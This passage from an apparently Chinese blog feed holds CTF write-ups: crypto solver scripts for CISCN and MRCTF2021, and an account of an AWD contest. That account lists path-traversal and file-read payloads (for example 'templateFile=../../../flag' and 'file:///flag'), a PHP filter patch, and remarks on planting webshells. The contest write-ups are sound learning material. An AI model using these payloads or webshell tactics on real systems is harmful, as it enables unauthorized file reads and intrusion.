class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span></span><br><span class="line">y = -<span class="number">22131877391133483964429946329193825460775374851078084751208971056041193500203</span></span><br><span class="line">c = (<span class="number">6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605</span>, <span class="number">38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028</span>)</span><br><span class="line">x = -<span class="number">26279444166664821795077701675621823220865336004430428203703688888211697122228</span></span><br><span class="line">k = e*x-y*n</span><br><span class="line">K = k//y</span><br><span class="line"><span class="built_in">print</span>(k)</span><br><span class="line"><span class="built_in">print</span>(K)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factor</span>(<span class="params">K,N</span>):</span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    r = K</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">518</span>):</span><br><span class="line">        s = (l+r)//<span class="number">2</span></span><br><span class="line">        v = s*s - (<span class="number">9</span>*s*s*(K-<span class="number">1</span>-s)*(K-<span class="number">1</span>-s)//(<span class="built_in">round</span>(N**<span class="number">0.25</span>)*<span class="built_in">round</span>(N**<span class="number">0.25</span>)))</span><br><span class="line">        <span class="keyword">if</span> v &lt; <span class="number">4</span>*N:</span><br><span class="line">            l = s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = s</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">factor(K,n)</span><br><span class="line"></span><br><span class="line">S = <span class="number">18383013852155207284866834850624501649134164688503883162216824258842790032992437383933186349369945088653252318167911285710266631681220716855493349532603970</span></span><br><span class="line">d = inverse(e,n+<span class="number">1</span>+S)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line">m = mul(d,c)</span><br><span class="line">flag = long_to_bytes(m[<span class="number">0</span>]) + long_to_bytes(m[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="robot"><a href="#robot" class="headerlink" title="robot"></a>robot</h4><p>追踪TCP流找到坐标，画图即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;data.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">data = f.read()</span><br><span class="line"></span><br><span class="line">ff = re.<span class="built_in">compile</span>(<span class="string">r&#x27;Value.\[(.*?)\]&#x27;</span>)</span><br><span class="line">res = ff.findall(data)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">x_list = []</span><br><span class="line">y_list = []</span><br><span class="line">z_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    i = i.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">    x,y,z = <span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(i[<span class="number">1</span>]),<span class="built_in">int</span>(i[<span class="number">2</span>])</span><br><span class="line">    x_list.append(x)</span><br><span class="line">    y_list.append(-y)</span><br><span class="line">    z_list.append(z)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x_list)</span><br><span class="line"><span class="built_in">print</span>(y_list)</span><br><span class="line"><span class="built_in">print</span>(z_list)</span><br><span class="line"></span><br><span class="line">plt.plot(x_list,y_list,<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;CISCN&#123;&quot;</span>+md5(<span class="string">b&quot;easy_robo_xx&quot;</span>).hexdigest()+<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="华东北半决赛"><a href="#华东北半决赛" class="headerlink" title="华东北半决赛"></a>华东北半决赛</h2><p>攻防科技大学主办的，半决赛就发衣服，80个队的awd体验还不错（？</p><h3 id="冥场面"><a href="#冥场面" class="headerlink" title="冥场面"></a>冥场面</h3><p><img src="https://ftp.bmp.ovh/imgs/2021/06/ff365a6892aea9b8.png" alt="冥场面"></p><p>虽然自己被打傻了，不过自己也打了个爽，全程看流量打人&#x2F;修站（雾</p><h4 id="cafecms"><a href="#cafecms" class="headerlink" title="cafecms"></a>cafecms</h4><p>构造了这么几种payload</p><blockquote><p>&#x2F;wap&#x2F;Common&#x2F;show?templateFile&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag<br>&#x2F;wap&#x2F;Common&#x2F;show?templateFile&#x3D;&#x2F;flag<br>&#x2F;wap&#x2F;Common&#x2F;show?templateFile&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;flag</p></blockquote><p>去找了一下调用的函数位置，检查一下templateFile如果有flag直接改空就防住了</p><p>D盾还扫出来个eval后门，只不过不会用也不会修，后来被打的连妈都不认识了w</p><h4 id="eyou"><a href="#eyou" class="headerlink" title="eyou"></a>eyou</h4><p>刚开始没看这题，连上之后发现MySQL库被人删了，再后来直接被get shell了，又是一个被打的连妈都不认识的站w</p><p>在之后重启了一波，结果<code>admin.php</code>给人写了rce，flag直接被挂首页w</p><h4 id="cryptopark"><a href="#cryptopark" class="headerlink" title="cryptopark"></a>cryptopark</h4><p>awd里居然看见了密码题？拖进IDA看了两眼发现有好几个密码题，而且只要小小伪造一下就能<code>\bin\sh</code>了，然后光速写了几个密码exp接着打全场<del>（嘻嘻）</del>，后来师傅们也从堆用pwn的方法get shell了，接着拿去批量跑</p><h4 id="lol"><a href="#lol" class="headerlink" title="lol"></a>lol</h4><p>又是个任意读，不过这次我手速快，光速写exp打了一波全场 <del>（嘻嘻）</del><br>大概这么几种姿势</p><blockquote><p>&#x2F;statics&#x2F;1.php?file&#x3D;file:&#x2F;&#x2F;&#x2F;flag<br>&#x2F;statics&#x2F;1.php?file&#x3D;&#x2F;flag<br>&#x2F;statics&#x2F;1.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</p></blockquote><p>修好之后发现还有人打，抓了一下流量看到这个payload</p><blockquote><p>&#x2F;index.php?g&#x3D;Admin&amp;m&#x3D;Public&amp;a&#x3D;display&amp;templateFile&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</p></blockquote><p>web小白根本看不太懂PHP，更别说代码审计了wAw，于是就现场看着PHP手册和原先写好的PHP源码现场极限学习</p><p>先看<code>index.php</code>有这么段读参数的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&quot;g&quot;</span>, <span class="string">&quot;m&quot;</span>) <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="variable">$v</span>])) &#123;</span><br><span class="line">        <span class="variable">$_GET</span>[<span class="variable">$v</span>] = <span class="title function_ invoke__">ucwords</span>(<span class="variable">$_GET</span>[<span class="variable">$v</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那既然这段payload要过index.php，而所传的变量名又已知，为了短期防御，那么就可以在这个地方把所有的变量都读进来，然后处理掉就行了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&quot;g&quot;</span>, <span class="string">&quot;m&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;templateFile&quot;</span>) <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="variable">$v</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$v</span> == <span class="string">&quot;templateFile&quot;</span> &amp;&amp; (</span><br><span class="line">        (<span class="variable">$_GET</span>[<span class="variable">$v</span>][<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="variable">$v</span>][<span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) ||</span><br><span class="line">        (<span class="variable">$_GET</span>[<span class="variable">$v</span>][<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="variable">$v</span>][<span class="number">1</span>] == <span class="string">&#x27;f&#x27;</span>) ||</span><br><span class="line">        (<span class="variable">$_GET</span>[<span class="variable">$v</span>][<span class="number">0</span>] == <span class="string">&#x27;f&#x27;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="variable">$v</span>][<span class="number">1</span>] == <span class="string">&#x27;i&#x27;</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_GET</span>[<span class="variable">$v</span>] = <span class="title function_ invoke__">ucwords</span>(<span class="variable">$_GET</span>[<span class="variable">$v</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修好之后接着拿这几个payload去打别人了（</p><blockquote><p>&#x2F;index.php?g&#x3D;Admin&amp;m&#x3D;Public&amp;a&#x3D;display&amp;templateFile&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag<br>&#x2F;index.php?g&#x3D;Admin&amp;m&#x3D;Public&amp;a&#x3D;display&amp;templateFile&#x3D;&#x2F;flag<br>&#x2F;index.php?g&#x3D;Admin&amp;m&#x3D;Public&amp;a&#x3D;display&amp;templateFile&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;flag</p></blockquote><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>打到后面后台脚本把内存跑到16G，加上OBS和一堆乱七八糟的玩意中间炸过一次内存w，到最后的时候被打成筛子就只能检查自己的批量脚本有没有正常工作了，7个while 1的脚本同时跑着10+的payload，还有五六个打奇奇怪怪的混淆流量的脚本 （雾</p><p>各位师傅们的混淆也是tmd千奇百怪，我以为我防出去了啊，结果师傅们不讲武德，给我种🐎，打开流量我定睛一看，在一堆<code>fmyy i love you</code>、<code>xxxx yyds</code>还有奇奇怪怪的歌词里面，写的竟然全是<code>.shell.php</code>！（雾</p><p>既然我们有🐎，那别人肯定也有，然后搭了几趟顺风车，不过web小白啥也不会，别人稍微藏起来之后就尬住了w</p><p>结果rk20<br><img src="https://ftp.bmp.ovh/imgs/2021/06/066f70ace15336c0.png" alt="res"></p><p>唉，还是太菜了，第一年也只能止步于此了（</p><h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p><del>u1s1，平时都凭本事打进了W&amp;M，结果校赛被分到3队有、不开心</del></p><p>初赛高考没啥好说的，crypto打了2k+的分把2队按在地上锤（雾</p><p>怎么说呢，第一次打awd的萌新算是打了个爽，线下前一天晚上还在和<code>h3zh1</code>师傅学习怎么打awd，在现场用<code>ha1c9on</code>师傅教过的一点web加被迫极限学习边打边修，可能从此就转路web了（？</p><p><del>我也要在别人机子上种🐎！我也要get shell！（逃</del></p><p>感谢师傅们对我这个fw的栽培和帮助，qaq明年继续加油吧</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;祭第一次国赛-x2F-第一次AWD&quot;&gt;&lt;a href=&quot;#祭第一次国赛-x2F-第一次AWD&quot; class=&quot;headerlink&quot; title=&quot;祭第一次国赛&amp;#x2F;第一次AWD&quot;&gt;&lt;/a&gt;祭第一次国赛&amp;#x2F;第一次AWD&lt;/h1&gt;&lt;p&gt;华东北太卷啦太卷</summary>
      
    
    
    
    <category term="AWD" scheme="http://example.com/categories/AWD/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="AWD" scheme="http://example.com/tags/AWD/"/>
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Misc" scheme="http://example.com/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>Writeup for MRCTF2021 crypto</title>
    <link href="http://example.com/2021/04/16/Wp_for_mrctf2021/"/>
    <id>http://example.com/2021/04/16/Wp_for_mrctf2021/</id>
    <published>2021-04-16T11:58:26.000Z</published>
    <updated>2021-04-25T12:07:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Writeup-for-MRCTF2021-39-s-crypto"><a href="#Writeup-for-MRCTF2021-39-s-crypto" class="headerlink" title="Writeup for MRCTF2021&#39;s crypto"></a>Writeup for MRCTF2021&#39;s crypto</h1><p>比赛前打了疫苗，困得要命，然后神志不清的写了一堆shi，虽然比赛的时候心态炸了，但高质量的题目该复现还得复现</p><h2 id="friendly-sign-in"><a href="#friendly-sign-in" class="headerlink" title="friendly_sign-in"></a>friendly_sign-in</h2><p>签到题，定义了一个函数，要求提供使得 $f(x_{list})&#x3D;0$ 的<code>x-list</code>，回答一次给一位 $flag$ ，但之后的不能和之前的重复</p><p>直接系数两两交换，其中一个取相反数，然后为了前后不重复再乘一个系数即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;node.mrctf.fun&quot;</span>, <span class="string">&quot;10007&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">passpow</span>():</span><br><span class="line">    rev = r.recvuntil(<span class="string">&quot;POW: SHA512(&quot;</span>)</span><br><span class="line">    r.recv(<span class="number">1</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">8</span>).decode()</span><br><span class="line">    <span class="built_in">print</span>(suffix)</span><br><span class="line">    r.recvline()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x</span>):</span><br><span class="line">        hashresult = hashlib.sha512((suffix+x).encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> hashresult.startswith(<span class="string">&quot;11111&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    prefix = util.iters.mbruteforce(f,table,<span class="number">4</span>,<span class="string">&#x27;upto&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(prefix))</span><br><span class="line"></span><br><span class="line">passpow()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvuntil(<span class="string">&quot;N = &quot;</span>)</span><br><span class="line">data = r.recvline(<span class="literal">False</span>).strip().decode()[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">data = data.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">N = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    N.append(<span class="built_in">int</span>(i))</span><br><span class="line"><span class="comment"># print(len(N))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(N)-<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(N),<span class="number">2</span>):</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(-(j+<span class="number">1</span>)*N[i+<span class="number">1</span>]))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>((j+<span class="number">1</span>)*N[i]))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;your gift:&quot;</span>)</span><br><span class="line">    ans = r.recvline(<span class="literal">False</span>).strip().decode()</span><br><span class="line">    flag += ans</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(flag,<span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.interactive()</span></span><br></pre></td></tr></table></figure><h2 id="nomore"><a href="#nomore" class="headerlink" title="nomore"></a>nomore</h2><p>小模数RSA，其中 $e\in (9000,10000)$ ， $p,q\in (1000000, 3000000)$ ，给了 $A&#x3D;(((y%x)^7)%(x%y))^7+y^5+(y+1)&#x2F;x$ ，一个条件 $secret&#x3D;e^3+p^3+q^3&#x3D;(x+y)%7754486886526049041+210729175671163973$ 和 $x$ 的上界</p><p>感觉是为了出题而出题，条件给的好僵硬（</p><p>因为这里是 $(y+1)&#x2F;x$ 整除，所以得到 $y+1&#x3D;k\cdot x$ （这样出题这里好没有说服力啊&#x3D; &#x3D;），所以 $y&#x3D;k\cdot x-1$ ，带入A中化简一下可得 $A&#x3D;(x-1)^7+(kx-1)^5+k$ ，显然这个玩意是递增的，而且给了 $x$ 的上界，这里可以用二分法得到 $x$ 的值，随后得到 $secret$ ，接着爆破得到 $e,p,q$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">693282726315</span></span><br><span class="line">A = <span class="number">2235930885430590738951770802593215586722001521194365487273377655750584443688709547709496531484159367793509666612116139038917661713102981488722293426038029073850795986080412124312908732573382156365974821471629333126275130148211145598662897276781331183691743094904957217401055325352877284530068805608962270139656431076370452327497416723045785664344412694060886085511378779487559306015113302658964110922621164879307182468690182325142055960562810349297544601157473985262796723316777380726315782859115449976700612343978057140270903396910431420116573138154719798955123904805279320166126412714788508008881174164656203605409187705643395043643983135944514470267283183175620492198093264226038082725867230101096344723124629565311122528005863046865164876192248803940590219355154176343702897505891392317123983475290611327887699795851456183931854177169939743970260837586185988111368384484356413787993370384262996486824251003884057486063787194241555190688935624792041028246639984544749568167915235629185515957106136630401960066317998226671344793061752525215496195839080165952892472180997564802474095868944184005854120238623750555477937802107959321257495435617363809377093354132077991399603767147974592666019334636208414969819333321639542282741932229892501074615920120228860717401055433206357806353717291748096464569063777964784860874773660469621546777686833078007220613545223169043960754010332944526795605043595879174073360317477199909570141202125189377475655277483919081658123820105695508771837612756891055031293872293977244105248233915807603916034288916844336329883443200123825714530812637709561686224468031953278836676202928878535091578725509651544544672494980806630321114490828976895602038151224026672265830787863940762596976124958000977955469148027648603199590311852993367450800166591526272653355552342455506908317529193196174849749103073968182002498580115241030154502931088245539152380579199202750010140022979979488971008874424439325749039212427088023136971891092490697689178097172878439007028844083681030357488034860471042630885195387680286557424780235116405464735985082715745087677866688657626763753940919966662710093619034074861812080778855241391731006</span></span><br><span class="line"></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    upper = <span class="number">4000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">    lower = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(upper - lower &gt; <span class="number">1</span>):</span><br><span class="line">        x = (upper + lower) &gt;&gt; <span class="number">1</span></span><br><span class="line">        ans = (x-<span class="number">1</span>)**<span class="number">7</span> + (k*x-<span class="number">1</span>)**<span class="number">5</span> + k</span><br><span class="line">        <span class="keyword">if</span>(ans == A):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Ans Found!&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(k,x)</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span>(ans &gt; A):</span><br><span class="line">            upper = x</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lower = x</span><br><span class="line">    <span class="keyword">if</span>(flag):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">y = k*x - <span class="number">1</span></span><br><span class="line">secret = (x + y) % <span class="number">7754486886526049041</span> + <span class="number">210729175671163973</span></span><br><span class="line">my_prime = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000001</span>,<span class="built_in">min</span>(<span class="number">3000000</span>,iroot(secret,<span class="number">3</span>)[<span class="number">0</span>]),<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span>(isPrime(i)):</span><br><span class="line">        my_prime.append(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Prime ready! Found&quot;</span>,<span class="built_in">len</span>(my_prime),<span class="string">&quot;primes.&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9001</span>,<span class="number">10001</span>,<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> my_prime:</span><br><span class="line">        ans = iroot(secret - e**<span class="number">3</span> - p**<span class="number">3</span>,<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span>(ans[<span class="number">1</span>]):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Ans Found!&quot;</span>)</span><br><span class="line">            q = ans[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(e,p,q)</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span>(flag):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="Common-Prime-RSA"><a href="#Common-Prime-RSA" class="headerlink" title="Common_Prime_RSA"></a>Common_Prime_RSA</h2><blockquote><p><a href="https://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.33.1333&rep=rep1&type=pdf">paper</a></p></blockquote><p>如题， $p&#x3D;2ag+1,q&#x3D;2bg+1$ ，其中 $g&#x3D;N^{\beta}$ ，$\beta_1&#x3D;0.2247,\beta_2&#x3D;0.3247$ </p><p>第一部分， $g$ 显然是个比较小的数，直接coppersmith就能拿到，接着来考虑分解 $N$ ， 显然 $N&#x3D;p\cdot q&#x3D;(2ag+1)(2bg+1)&#x3D;4abg^2+2g(a+b)+1$ ，则</p><p>$$\frac{N-1}{2g}&#x3D;2gab+(a+b)$$</p><p>但由于 $\beta&#x3D;0.2247&lt;0.5$ ，导致 $g&lt;a,b$ ， 我们假设 $\frac{N-1}{2g}&#x3D;2gu+v$ ，则 $v&#x3D;a+b-2gc,u&#x3D;ab+c$ ，那么 $x^{u2g}\equiv x^{ab2g+c2g}\equiv x^{c2g}\pmod{N}$ ，即 ${x^{2g}}^u&#x3D;{x^{2g}}^c$ ，所以我们可以使用 $bsgs$ 算法来得到 $c$ ，因为题目中 $p$ 与 $q$ 较为接近，所以上述的 $a$ 与 $b$ 也比较接近，我们知道 $a\cdot b≈u≈\frac{N}{(2\cdot g1)^2}$ ， 根据对勾函数的性质， $x≈y\in (\sqrt{u},\sqrt{2u})$ ，随后即可得到 $c$ 较为精确的答案区间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 